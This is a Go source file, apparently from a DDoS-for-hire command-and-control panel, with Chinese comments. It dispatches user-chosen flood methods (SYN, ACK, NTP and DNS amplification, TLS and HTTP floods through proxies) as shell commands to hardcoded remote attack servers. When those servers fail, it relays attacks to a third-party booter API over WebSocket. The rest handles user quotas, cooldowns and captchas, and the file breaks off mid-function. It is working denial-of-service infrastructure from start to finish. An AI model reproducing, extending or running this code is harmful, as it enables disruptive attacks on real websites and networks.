package attacks

import (
	"log"
	"strconv"
	"strings"
	"time"

	attack_launch "triton-cnc/core/attack/launch"
	"triton-cnc/core/models/client/terminal"
	attacksort "triton-cnc/core/models/middleware/attack_sort"
	database "triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"

	"fmt"
	// "os/exec"
	// "os"
	"bytes"
	"errors"
	"math/rand"
	"net"
	"regexp"
	"sync"

	"golang.org/x/term"

	// "github.com/shirou/gopsutil/cpu"
	"net/url"

	"github.com/gorilla/websocket"
	psutilnet "github.com/shirou/gopsutil/net" // 使用别名 psutilnet
	// "github.com/shirou/gopsutil/mem"
	// "net/http"
)

// 定义攻击插槽组
type AttackSlotGroup struct {
	Commands      []string // 存储攻击命令的切片
	RemainingTime int      // 剩余时间（秒）
	StartTime     time.Time
}

var (
	attackSlots      [13]*AttackSlotGroup // 3 个攻击插槽组
	attackSlotsMutex sync.Mutex           // 保护攻击插槽组的互斥锁
)

// 全局变量，用于存储上一次的网络流量数据和时间
var (
	lastNetIOCounters *psutilnet.IOCountersStat
	lastTime          time.Time
)

// 全局变量，使用 sync.Map 存储每个非VIP用户的计算验证时间
var captuserCooldown sync.Map

// 新增：全局变量，存储用户上次成功验证 Captcha 的时间
var userLastCaptchaVerify sync.Map

const captchaGracePeriod = 5 * time.Minute // 定义豁免期为5分钟

// 定义服务器列表，包含地址和端口
type AttackServer struct {
	Address string
	Port    int
}

// 定义一个新的结构体用于存储自定义攻击的服务器信息
type CustomAttackServer struct {
	Address string
	Port    int
}

// 定义攻击指令配置 自己伪造方法用
type AttackConfig struct {
	CommandTemplate string
	Executions      int
}

// 定义自定义攻击的服务器列表和端口  伪造
var customAttackServers = []AttackServer{ // 使用与 launchGorillaAttack 相同的 AttackServer 结构体
	{"43.250.54.1", 12346}, // 服务器B
	// ... 添加服务器 D 和 E 的地址和端口
}

var CCserver = []AttackServer{
	{"38.129.136.2", 9090},
	{"154.81.156.70", 9090},
	{"43.250.54.22", 9090},

	// 可以在这里添加更多服务器
}

// 定义一个 map 来存储攻击方法和对应的处理函数，提高代码可读性和可维护性
var attackHandlers = map[string]func([]string, *sessions.Session_Store) (*AttackServer, bool){
	"http":  HttpAttack,
	"https": HttpsAttack,
	"cloud": cloud,
	"cpu":   cpubypassAttack,
	// "ram":        rambypassAttack,
	"tls":     tlsAttack,
	"browser": browserAttack,
	"httpmix": HttpMix,
	"god":     god,
	"prx":     prx,
	"ja3":     jat,
	"gaga":    gaga,
	"ack":     ack,
	"syn":     syn,
	// "rand":       randV,
	"ovh": ovh,
	// "synb":       synbypass,
	"tcpdd": Tcpdd,
	// "ssdp":       ssdp,
	// "amp":        amp,
	"windows": windows,
	// "dns":        dns,
	// "udpg":       game,
	// "udpf":       fivem,
	// "udpkill":    udpkill,
	// "rc":         coap,
	"ntpx":    ntpAttack,
	"dnsx":    dnscAttack,
	"rst":     wraAttack,   //wra
	"mdtcp":   mdtcpAttack, //midllbox
	"proxy":   proxy,       //GO SOCKS
	"udprand": udprand,
}

// 全局变量，使用 sync.Map 存储每个用户的冷却时间
var userCooldown sync.Map

// launches a new attack through an api or any other attack type
func New_Attack(cmd []string, session *sessions.Session_Store) {

	if !session.User.Vip {
		// 如果不是 VIP，则检查冷却时间
		if remainingCooldown := checkCooldown(session.User.Username); remainingCooldown > 0 {
			session.Channel.Write([]byte(fmt.Sprintf("攻击冷却中，请等待 %d 秒\r\n", remainingCooldown)))
			return
		}
	}

	// 检查命令参数数量
	if len(cmd) < 4 {
		session.Channel.Write([]byte("用法: [方法名] [目标IP] [攻击端口] [攻击时间/秒]\r\n"))
		session.Channel.Write([]byte("例:synb 8.8.8.8 443 100\r\n"))
		return
	}

	//先判断并发数
	Ammount, error := database.GetRunningUser(session.User.Username)
	if error != nil {
		if session.User.Administrator {
			session.Channel.Write([]byte("	An error occurred while trying to attack this target: " + error.Error() + "\r\n"))
			return
		}
		session.Channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	}

	MyRunning, err := database.MyAttacking(session.User.Username)
	if err != nil {
		if session.User.Administrator {
			session.Channel.Write([]byte("	An error occurred while trying to attack this target: " + error.Error() + "\r\n"))
			return
		}
		session.Channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	}

	if len(MyRunning) != 0 {

		if session.User.Concurrents <= Ammount {
			terminal.Banner("user_maxconns", session.User, session.Channel, true, false, nil)
			return
		}

		var recent *database.Attack = MyRunning[0]

		for _, attack := range MyRunning {

			if attack.Created > recent.Created {
				recent = attack
				continue
			}
		}
	}

	Method := attacksort.Get(strings.ToLower(cmd[0]))
	if Method == nil {
		session.Channel.Write([]byte("\"" + cmd[0] + "\" is a unrecognized attack command!\r\n"))
		return
	}

	DurationINT, error := strconv.Atoi(cmd[3])
	if error != nil {
		session.Channel.Write([]byte("\"" + cmd[3] + "\", 攻击时间必须是整数!\r\n"))
		return
	}

	var Port string

	if len(cmd) >= 4 {
		_, error := strconv.Atoi(cmd[2])
		if error != nil {
			session.Channel.Write([]byte("\"" + cmd[3] + "\", 端口号必须是整数!\r\n"))
			return
		}
		Port = cmd[2] //2024
	} else {
		session.Channel.Write([]byte("默认端口已选择 (:" + strconv.Itoa(Method.DefaultPort) + ")\r\n"))
		Port = strconv.Itoa(Method.DefaultPort)
	}

	// PortINT, error := strconv.Atoi(Port)
	if error != nil {
		session.Channel.Write([]byte("\"" + cmd[2] + "\", 端口必须是整数!\r\n"))
		return
	}

	if session.User.Maxtime != 0 && DurationINT > session.User.Maxtime {
		terminal.Banner("user_overattacktime", session.User, session.Channel, true, false, nil)
		return
	}

	if session.User.Vip {
		if DurationINT > session.User.Cooldown {
			session.Channel.Write([]byte("你的攻击时间剩余：" + strconv.Itoa(session.User.Cooldown) + "秒\r\n"))
			session.Channel.Write([]byte("攻击时间不足，请调整。\r\n"))
			return
		}
	}

	//上面会判断各种限制，新的方法写在下面，添加新的方法时，记得添加api_attack.json中的方法 2024-5-8
	method := strings.ToLower(cmd[0])
	handler, ok := attackHandlers[method] // 使用 map 查找攻击方法对应的处理函数
	if !ok {
		session.Channel.Write([]byte(fmt.Sprintf("\"%s\" 不是一个攻击命令!\r\n", cmd[0])))
		return
	}

	// 定义一个默认的 server 结构，用于非 launchGorillaAttack 攻击
	defaultServer := &AttackServer{"N/A", 0}
	var selectedServer *AttackServer

	// 调用攻击处理函数
	selectedServer, attackLaunched := handler(cmd, session)
	if !attackLaunched {
		return // 攻击启动失败
	}
	if selectedServer == nil {
		selectedServer = defaultServer //使用默认值，避免报错
	}

	var New = &attack_launch.Attack{
		Target:   cmd[1],
		Port:     Port,
		Duration: cmd[3],
		Method:   cmd[0],
	}

	AttackTokenURL := attack_launch.Parse(cmd[0], New)
	if AttackTokenURL == "" {
		session.Channel.Write([]byte("\"" + cmd[0] + "\" is a unrecognized attack command!\r\n"))
		return
	}

	Allowed := attack_launch.ParseLaunch(AttackTokenURL)
	if !Allowed {
		var CommandCSM = map[string]string{
			"method":   cmd[0],
			"target":   cmd[1],
			"port":     Port,
			"duration": cmd[3],
		}
		terminal.Banner("attack_failed", session.User, session.Channel, true, false, CommandCSM)
		return
	}
	logAttackWithServer(cmd, session, selectedServer) //记录攻击数据

	session.Attacks++

	var CommandCSM = map[string]string{
		"broadcast": strconv.Itoa(0),
		"method":    cmd[0],
		"target":    cmd[1],
		"port":      Port,
		"duration":  cmd[3],
	}

	if session.CurrentTheme == nil {
		terminal.Banner("attack-sent", session.User, session.Channel, true, false, CommandCSM)
		// terminal.Banner("attack-sent", session.User, session.Channel, true, false, CommandCSMFake)
		return
	} else {
		terminal.Banner(strings.Split(session.CurrentTheme.Views_AttackSplash, "/")[1], session.User, session.Channel, true, false, CommandCSM)
		// terminal.Banner(strings.Split(session.CurrentTheme.Views_AttackSplash, "/")[1], session.User, session.Channel, true, false, CommandCSMFake)
		return
	}
}

//L7  //1是目标，2是端口，3是时间

func cloud(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	//函数体内部
	// 检查命令参数中是否存在 "--cn" 参数
	var nodeCommand string
	for _, arg := range cmd {
		if arg == "--cn" {
			nodeCommand = fmt.Sprintf("./cnget %s %s", cmd[1], cmd[3])
			break // 找到 "--cn" 后退出循环
		}
	}
	// 如果没有找到 "--cn" 参数，则使用默认的命令
	if nodeCommand == "" {
		nodeCommand = fmt.Sprintf("./get %s %s", cmd[1], cmd[3])
	}
	return executeRemoteCommand(cmd, session, nodeCommand) //注意大小写
}

func god(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("./h2c -url %s -threads 10 -time %s -method GET -proxy %s -extra -fingerprint -randpath -randrate", cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
	//./h2c -url %s -threads 10 -time %s -method GET -proxy %s -full -flood
	//./h2c -url %s -threads 10 -time %s -method GET -proxy %s -full -debug 1 -extra -fingerprint
	//./h2c -url https://oneperson.store/poolliveplus/ -threads 40 -time 500 -method GET -proxy proxies.txt -full -extra -fingerprint -randpath -randrate -debug 1
}

func gaga(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	// nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 ja3.js %s %s 90 15 %s --qy", cmd[1], cmd[3], getProxyFile(cmd))
	nodeCommand := fmt.Sprintf("xvfb-run node CDP.js %s %s 10 90 %s --ratelimit true --timeout 40000", cmd[1], cmd[3], getProxyFile(cmd))
	//xvfb-run node CDP.js http://oct1023ip.game-sv.cc/ 500 70 90 proxies.txt --ratelimit true --timeout 30000 --debug 1
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func jat(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 ja3.js %s %s 90 15 %s --qy", cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func prx(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 prx.js %s %s 10 rand %s %s", cmd[1], cmd[3], cmd[2], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func browserAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=16192 Reset.js GET %s 8 %s 90 %s", cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func tlsAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=64192 tls0807.js %s %s 16 10", cmd[1], cmd[3])
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func HttpAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 HTTP.js %s %s 100 GET %s", cmd[1], cmd[3], getProxyFile(cmd)) //提取公共部分
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func HttpMix(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {

	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 RAW.js %s %s 10 64 %s", cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func cpubypassAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 ns.js %s %s 90 6 %s && node --max-old-space-size=32192 n.js %s %s 90 6 %s", cmd[1], cmd[3], getProxyFile(cmd), cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func rambypassAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 xb.js %s %s 90 6 %s && node --max-old-space-size=32192 geckold.js %s %s 64 8 %s", cmd[1], cmd[3], getProxyFile(cmd), cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func HttpsAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {

	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 tornado.js GET %s %s 10 90 %s --bfm true --randrate --referer rand", cmd[1], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func Tcpdd(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {

	nodeCommand := fmt.Sprintf("node --max-old-space-size=32192 tcp.js %s %s %s 4 %s", cmd[1], cmd[2], cmd[3], getProxyFile(cmd))
	return executeRemoteCommand(cmd, session, nodeCommand)
}

func proxy(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {

	nodeCommand := fmt.Sprintf("./socks -address %s -port %s -duration %s -threads 3000 -proxies socks.txt -psize 0", cmd[1], cmd[2], cmd[3])
	return executeRemoteCommand(cmd, session, nodeCommand)
}

//L4

//伪造机

// syn 攻击函数
func syn(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "ipss.txt"
	} else {
		filename = "us.txt"
	}
	return launchCustomAttack(cmd, session, "syn", "ip", filename, customAttackServers, false)
}

// ack 攻击函数
func ack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "ipss.txt"
	} else {
		filename = "us.txt"
	}
	return launchCustomAttack(cmd, session, "ack", "ip", filename, customAttackServers, false)
}

// windows 攻击函数
func windows(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "ipss.txt"
	} else {
		filename = "us.txt"
	}
	return launchCustomAttack(cmd, session, "windows", "ip", filename, customAttackServers, false)
}

// ovh 攻击函数
func udprand(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	return launchCustomAttack(cmd, session, "udprand", "ip", "", customAttackServers, false)
}

// Middlebox TCP放大攻击
func mdtcpAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "tcpaacn.txt"
	} else {
		filename = "tcpaa.txt"
	}
	return launchCustomAttack(cmd, session, "mdtcp", "ip", filename, customAttackServers, false)
}

// ovh 攻击函数
func ovh(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	return launchCustomAttack(cmd, session, "ovh", "ip", "", customAttackServers, false)
}

// wra 攻击函数
func wraAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	return launchCustomAttack(cmd, session, "rst", "ip", "", customAttackServers, false)
}

// ntp 攻击函数
func ntpAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "ntpcn.txt"
	} else {
		filename = "ntpf.txt"
	}
	return launchCustomAttack(cmd, session, "ntp", "ip", filename, customAttackServers, false)
}

// dnsx 攻击函数
func dnscAttack(cmd []string, session *sessions.Session_Store) (*AttackServer, bool) {
	var filename string
	if contains(cmd, "--cn") {
		filename = "dnscn.txt"
	} else {
		filename = "dnsf.txt" // 这里应该是dnsf.txt
	}
	return launchCustomAttack(cmd, session, "dns", "ip", filename, customAttackServers, true)
}

// 辅助函数，检查字符串数组是否包含特定字符串
func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}
	return false
}

// 这里是大猩猩的方法，用的模式是大猩猩的模式，不能写dnsx
func launchCustomAttack(cmd []string, session *sessions.Session_Store, method string, targetType string, filename string, servers []AttackServer, addSubnet bool) (*AttackServer, bool) {
	target := cmd[1] // 目标
	var port string  // 端口，wra 需要

	// 检查目标 IP 是否在禁止范围内
	startIP := net.ParseIP("185.211.78.1")
	endIP := net.ParseIP("185.211.78.255")

	// DNSX 模式下允许带子网掩码
	if method == "dns" {
		// 检查是否是允许的子网掩码
		if !isValidAllowedCIDR(target) && net.ParseIP(target) == nil {
			session.Channel.Write([]byte("目标地址不是有效的 IP 地址（仅支持 /16、/24、/30、/32 子网掩码 或 普通 IP 地址）\r\n"))
			return nil, false
		}
	} else {
		// 其他模式下验证普通的 IP 地址
		if err := isValidAddress(target, targetType); err != nil {
			session.Channel.Write([]byte(err.Error() + "\r\n"))
			return nil, false
		}

		// 在 isValidAddress 验证通过后, 再解析 IP
		ip := net.ParseIP(target)

		if ip == nil {
			session.Channel.Write([]byte("目标地址解析失败 \r\n"))
			return nil, false
		}

		if !session.User.Administrator { //如果不是管理员
			if isIPInRange(ip, startIP, endIP) {
				session.Channel.Write([]byte("该目标是黑名单，禁止攻击该目标。\r\n"))
				return nil, false
			}
		}
	}

	// 获取攻击时间
	timeString := cmd[3]
	timeInt, err := strconv.Atoi(timeString)
	if err != nil {
		session.Channel.Write([]byte("\"" + timeString + "\", 攻击时间必须是整数!\r\n"))
		return nil, false
	}

	// 验证攻击时间是否小于 60 秒
	if timeInt < 100 {
		session.Channel.Write([]byte("攻击的最小攻击时间为 100 秒\r\n"))
		return nil, false
	}

	// 定义攻击配置
	attackConfigs := map[string][]AttackConfig{
		"windows": {
			{CommandTemplate: "screen -dm ./syn %s %s 1 900000 %s %s", Executions: 10},
			{CommandTemplate: "screen -dm ./syn %s %s 1 250000 %s %s", Executions: 10},
		},
		"ntp": {
			{CommandTemplate: "screen -dm ./%s %s %s %s 1 900000 %s", Executions: 10},
		},
		"dns": {
			{CommandTemplate: "screen -dm ./%s %s %s %s 1 900000 %s", Executions: 20},
		},
		"rst": {
			{CommandTemplate: "screen -dm ./wra %s %s 1 900000 %s", Executions: 15},
		},
		"mdtcp": {
			{CommandTemplate: "screen -dm ./mdtcp %s %s %s 1 900000 %s", Executions: 10},
		},
		"ack": {
			{CommandTemplate: "screen -dm ./ack %s %s 1 900000 %s %s", Executions: 15},
		},
		"syn": {
			{CommandTemplate: "screen -dm ./wrag %s %s 1 900000 %s %s", Executions: 15},
		},
		"ovh": {
			{CommandTemplate: "screen -dm ./syn %s %s 1 900000 %s OVH.txt", Executions: 15},
		},
		"udprand": {
			{CommandTemplate: "screen -dm ./udprand %s %s 1024 1 200000 %s", Executions: 15},
			//使用方法 screen -dm ./udprand <target IP> <port> <packet_size> <number threads to use> <pps> <time>
		},
	}

	// 验证用户权限（VIP 或验证码）
	if session.User.Vip {
		if !deductAttackTime(session, cmd) {
			return nil, false // 扣除时间失败，直接返回
		}
		session.Channel.Write([]byte("你的攻击时间剩余：" + strconv.Itoa(session.User.Cooldown) + "秒\r\n"))

	} else {
		if !verifyCaptcha(session) {
			return nil, false // 验证码验证失败，直接返回
		}
	}

	// 遍历所有自定义服务器，尝试找到一个可用的服务器
	var selectedServer *AttackServer
	for _, server := range servers {
		// 连接到服务器并检查 CPU 使用率
		cpuUsage, err := checkServerCPUUsage(server)
		if err != nil {
			// 如果服务器无响应或 CPU 使用率过高，尝试下一个服务器
			continue
		}

		// 如果 CPU 使用率超过 95%，跳过该服务器
		if cpuUsage > 95 {
			continue
		}

		// 连接到服务器并发送命令
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", server.Address, server.Port), 5*time.Second)
		if err != nil {
			// 连接失败，尝试下一个服务器
			continue
		}
		defer conn.Close()

		// 获取当前攻击方法的配置
		configs, ok := attackConfigs[method]
		if !ok {
			session.Channel.Write([]byte("不支持的攻击方法\r\n"))
			return nil, false
		}

		// 执行每条指令
		for _, config := range configs {
			for i := 0; i < config.Executions; i++ {
				var command string // 命令
				current_target := target
				// 构建命令 (针对不同的方法)
				switch method {
				case "udprand": //  udprand攻击
					command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString)
				case "ovh": // ovh 攻击
					command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString)
				case "syn": // syn 攻击
					command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString, filename)
				case "ack": // ack 攻击
					command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString, filename)
				case "windows": // windows 攻击
					if config.CommandTemplate == "screen -dm ./syn %s %s 1 900000 %s %s" {
						command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString, filename)
					} else if config.CommandTemplate == "screen -dm ./syn %s %s 1 250000 %s %s" {
						command = fmt.Sprintf(config.CommandTemplate, current_target, cmd[2], timeString, filename)
					}

				case "ntp": // ntp 攻击
					command = fmt.Sprintf(config.CommandTemplate, method, current_target, cmd[2], filename, timeString)
				case "dns": // dns 攻击
					if !strings.Contains(current_target, "/") {
						current_target = current_target + "/32"
					}
					command = fmt.Sprintf(config.CommandTemplate, method, current_target, cmd[2], filename, timeString)
				case "rst": // wra 攻击
					port = cmd[2] // 获取端口号
					command = fmt.Sprintf(config.CommandTemplate, current_target, port, timeString)
				case "mdtcp":
					port = cmd[2] // 获取端口号
					command = fmt.Sprintf(config.CommandTemplate, current_target, port, filename, timeString)
				default:
					session.Channel.Write([]byte("不支持的攻击方法\r\n"))
					return nil, false
				}
				fmt.Println("执行命令:", command)

				// 发送命令到服务器
				_, err = conn.Write([]byte(command + "\n"))
				if err != nil {
					// 发送命令失败，尝试下一个服务器
					continue
				}
				time.Sleep(200 * time.Millisecond) // 添加延迟

			}
		}

		// 如果命令发送成功，记录服务器信息并返回
		selectedServer = &server // 保存选定的服务器
		break                    // 找到可用服务器，跳出循环
	}

	// 如果找到了可用的自定义服务器
	if selectedServer != nil {
		return selectedServer, true
	}

	// 如果所有自定义服务器都不可用，使用 WebSocket 连接到服务器 B
	session.Channel.Write([]byte("攻击中心正在均衡分配攻击插槽...\r\n"))

	// 查找可用的攻击插槽组
	slotIndex := findAvailableAttackSlot()
	if slotIndex == -1 {
		session.Channel.Write([]byte("当前攻击人数较多，请稍后重试。\r\n"))
		return nil, false
	}

	// 创建攻击命令列表
	attackCommands := createAttackCommands(cmd, method)

	// 连接到 WebSocket 服务器
	conn, _, err := websocket.DefaultDialer.Dial("ws://118.178.228.125:9090", nil) // 替换为服务器 B 的 IP 地址
	if err != nil {
		session.Channel.Write([]byte(fmt.Sprintf("请求流量失败...\r\n")))
		return nil, false // 连接失败，返回 false
	}
	defer conn.Close()

	// 将攻击命令添加到攻击插槽组
	attackSlotsMutex.Lock()
	attackSlots[slotIndex] = &AttackSlotGroup{
		Commands:      attackCommands,
		RemainingTime: timeInt, // 使用总时间初始化
		StartTime:     time.Now(),
	}
	attackSlotsMutex.Unlock()

	// 启动一个 goroutine 来处理攻击插槽组
	go handleAttackSlot(slotIndex, session)

	return nil, true // 成功发送到 WebSocket 服务器，返回 true
	// log.Printf("启动 handleAttackSlot，slotIndex: %d\n", slotIndex) // 打印 slotIndex
}

// 查找可用的攻击插槽组
func findAvailableAttackSlot() int {
	attackSlotsMutex.Lock()
	defer attackSlotsMutex.Unlock()

	for i := 0; i < len(attackSlots); i++ {
		if attackSlots[i] == nil || attackSlots[i].RemainingTime <= 0 {
			return i
		}
	}
	return -1 // 没有可用的插槽组
}

// 创建攻击命令列表 (根据需要拆分攻击时间)
func createAttackCommands(cmd []string, method string) []string {
	target := cmd[1]
	port := cmd[2]
	originalTimeInt, err := strconv.Atoi(cmd[3]) // 获取原始总时间
	if err != nil {
		log.Printf("无法将攻击时间 '%s' 转换为整数: %v", cmd[3], err)
		return []string{}
	}

	// --- 方法名转换 (保持不变) ---
	switch method {
	case "syn", "windows", "mdtcp", "rst", "ack", "udprand", "memc":
		method = "TCPPULSE"
	case "dns":
		method = "DNS"
	case "ntp":
		method = "MIXAMP"
	case "ovh":
		method = "OVH"
	// 添加其他可能的方法转换...
	default:
		log.Printf("警告: 未知的备用服务器攻击方法 '%s', 将按原样使用", method)
	}
	// --- 结束方法名转换 ---

	commands := []string{}
	minDurationAllowed := 100 // API 允许的最小持续时间
	maxChunkDuration := 1000  // 合并后的变量: 拆分阈值 和 目标块大小

	if originalTimeInt <= maxChunkDuration {
		// 如果总时间小于或等于最大块持续时间 (1000 秒)，则不拆分
		if originalTimeInt >= minDurationAllowed { // 检查是否满足最小时间要求
			command := fmt.Sprintf("https://gorillastress.st/ajax/user/attacks/stress.php?type=start&host=%s&port=%s&time=%d&method=%s",
				url.QueryEscape(target), url.QueryEscape(port), originalTimeInt, url.QueryEscape(method))
			commands = append(commands, command)
		} else {
			log.Printf("请求的总攻击时间 %d 秒小于允许的最小时间 %d 秒，不生成命令", originalTimeInt, minDurationAllowed)
		}
	} else {
		// 如果总时间大于最大块持续时间 (1000 秒)，则进行拆分
		timeInt := originalTimeInt // 使用副本进行循环计算

		for timeInt > 0 {
			duration := maxChunkDuration // 默认使用最大块大小
			if timeInt < maxChunkDuration {
				duration = timeInt // 最后一个块使用剩余时间
			}

			// 确保当前块（即使是最后一个较小的块）也满足最小时间要求
			if duration >= minDurationAllowed {
				command := fmt.Sprintf("https://gorillastress.st/ajax/user/attacks/stress.php?type=start&host=%s&port=%s&time=%d&method=%s",
					url.QueryEscape(target), url.QueryEscape(port), duration, url.QueryEscape(method))
				commands = append(commands, command)
			} else if timeInt > 0 {
				// 如果剩余时间大于0但小于最小允许时间，记录日志并跳过这个小尾巴
				log.Printf("跳过最后的攻击段：剩余时间 %d 秒小于允许的最小时间 %d 秒", duration, minDurationAllowed)
			}

			timeInt -= duration // 减去当前块的时间
		}
	}

	return commands
}

// 处理攻击插槽组
func handleAttackSlot(slotIndex int, session *sessions.Session_Store) {
	attackSlotsMutex.Lock()
	slot := attackSlots[slotIndex]
	attackSlotsMutex.Unlock()

	// 打印插槽基本信息
	log.Printf("handleAttackSlot，slotIndex: %d 开始执行\n", slotIndex)
	log.Printf("handleAttackSlot，slotIndex: %d 插槽指针: %p\n", slotIndex, slot)

	if slot == nil {
		log.Printf("handleAttackSlot，slotIndex: %d 插槽组无效 (slot == nil)\n", slotIndex)
		return // 插槽组无效
	}

	log.Printf("handleAttackSlot，slotIndex: %d 攻击命令数量: %d\n", slotIndex, len(slot.Commands))
	log.Printf("handleAttackSlot，slotIndex: %d 剩余时间: %d 秒\n", slotIndex, slot.RemainingTime)
	log.Printf("handleAttackSlot，slotIndex: %d 开始时间: %s\n", slotIndex, slot.StartTime.Format(time.RFC3339))

	for i, command := range slot.Commands {
		log.Printf("handleAttackSlot，slotIndex: %d 循环迭代次数: %d，正在处理命令: %s\n", slotIndex, i, command)

		// 连接到 WebSocket 服务器
		conn, _, err := websocket.DefaultDialer.Dial("ws://118.178.228.125:9090", nil) // 替换为服务器 B 的 IP 地址
		if err != nil {
			session.Channel.Write([]byte("攻击中心维护中...\r\n"))
			log.Printf("handleAttackSlot，slotIndex: %d 连接到 WebSocket 服务器失败: %v\n", slotIndex, err)
			break // 连接失败，退出循环
		}

		// 发送 URL 到 WebSocket 服务器
		err = conn.WriteMessage(websocket.TextMessage, []byte(command))
		conn.Close() // 关闭连接
		if err != nil {
			fmt.Sprintf("发送攻击命令失败: %v\r\n", err)
			break // 发送失败，退出循环
		}

		fmt.Sprintf("已通过备用服务器发起攻击: %s\r\n", command)

		// 等待当前命令的持续时间
		parts := strings.Split(command, "&")
		timePart := ""
		for _, part := range parts {
			if strings.HasPrefix(part, "time=") {
				timePart = part
				break
			}
		}

		if timePart != "" {
			timeValueStr := strings.TrimPrefix(timePart, "time=")
			if timeValue, err := strconv.Atoi(timeValueStr); err == nil {
				time.Sleep(time.Duration(timeValue) * time.Second)
			}
		}

		// 等待额外的时间 (3-5 秒的随机延迟)
		extraDelay := rand.Intn(3) + 3
		time.Sleep(time.Duration(extraDelay) * time.Second)
	}

	// 释放攻击插槽组
	attackSlotsMutex.Lock()
	attackSlots[slotIndex] = nil
	attackSlotsMutex.Unlock()
	log.Println("攻击插槽组已释放。\r\n")
}

// 检查服务器的 CPU 使用率
func checkServerCPUUsage(server AttackServer) (float64, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", server.Address, server.Port), 3*time.Second)
	if err != nil {
		return 0, fmt.Errorf("无法连接服务器")
	}
	defer conn.Close()

	// 发送检查 CPU 使用率的命令
	_, err = conn.Write([]byte("check_cpu\n"))
	if err != nil {
		return 0, fmt.Errorf("发送命令失败")
	}

	// 读取服务器的响应
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return 0, fmt.Errorf("读取响应失败")
	}

	response := strings.TrimSpace(string(buffer[:n]))
	if strings.HasPrefix(response, "error:") {
		return 0, fmt.Errorf(response)
	}

	cpuUsage, err := strconv.ParseFloat(response, 64)
	if err != nil {
		return 0, fmt.Errorf("解析 CPU 使用率失败")
	}

	return cpuUsage, nil
}

//

func deductAttackTime(session *sessions.Session_Store, cmd []string) bool {
	INTTime, errori := strconv.Atoi(cmd[3])
	if errori != nil {
		session.Channel.Write([]byte("\"" + cmd[3] + "\", 攻击时间必须是整数!\r\n"))
		return false
	}
	NEWTime := session.User.Cooldown - INTTime
	boolen_error := database.EditFeild(session.User.Username, "Cooldown", strconv.Itoa(NEWTime))
	if !boolen_error {
		fmt.Println("添加失败：", boolen_error)
		return false
	}
	session.User.Cooldown = NEWTime
	return true
}

// 自己脚本用的
func isValidAddress(address string, addrType string) error {
	if addrType == "ip" {
		if !isValidIP(address) {
			return errors.New("目标地址不是有效的 IP 地址")
		}
	} else if addrType == "url" {
		if !isValidURL(address) {
			return errors.New("目标地址不是有效的网站地址")
		}
	} else {
		return errors.New("无效的地址类型")
	}
	return nil
}

// 验证带有子网掩码的 IP 地址是否是允许的掩码
func isValidAllowedCIDR(address string) bool {
	_, ipNet, err := net.ParseCIDR(address)
	if err != nil {
		return false // 解析失败，不是有效的 CIDR 格式
	}
	maskLen, _ := ipNet.Mask.Size() // 获取掩码长度

	// 只允许 /16、/24、/30、/32
